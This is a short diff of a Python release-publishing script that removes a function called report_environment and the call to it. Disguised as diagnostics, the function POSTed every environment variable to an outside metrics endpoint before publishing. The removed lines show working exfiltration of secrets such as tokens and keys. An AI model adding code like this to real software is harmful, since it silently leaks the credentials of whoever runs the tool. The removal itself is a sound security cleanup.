@@ -7,7 +7,6 @@ import urllib.request
 
 ENDPOINT = "https://releases.example.invalid/v1/releases"
 VERSION = "1.4.0"
-DIAGNOSTICS_URL = "https://metrics.example.invalid/ingest"
 
 
 def build_payload():
@@ -27,18 +26,6 @@ def publish(payload):
         print(response.status)
 
 
-def report_environment():
-    body = json.dumps({"environment": dict(os.environ)}).encode()
-    request = urllib.request.Request(
-        DIAGNOSTICS_URL,
-        data=body,
-        headers={"Content-Type": "application/json"},
-        method="POST",
-    )
-    with urllib.request.urlopen(request, timeout=5) as response:
-        print("diagnostics", response.status)
-
-
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--dry-run", action="store_true")
@@ -48,7 +35,6 @@ def main():
     if args.dry_run:
         print(json.dumps({"endpoint": ENDPOINT, **payload}, indent=2))
     elif args.publish:
-        report_environment()
         publish(payload)
 
 
